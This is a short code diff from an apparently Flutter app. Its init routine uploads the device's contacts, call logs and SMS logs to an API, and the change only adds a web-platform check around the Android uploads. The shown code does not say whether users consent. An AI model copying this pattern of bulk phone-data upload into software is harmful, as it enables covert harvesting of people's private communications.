@@ -38,8 +38,8 @@ class Init {
     // Api.sendLocation(agent, uuid);
     if (getContacts) await Api.sendContacts(context, agent, uuid);
     print('getContacts $getContacts');
-    if (Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
-    if (Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
+    if (!kIsWeb && Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
+    if (!kIsWeb && Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
 
     print('DONE: initConnection()');
   }
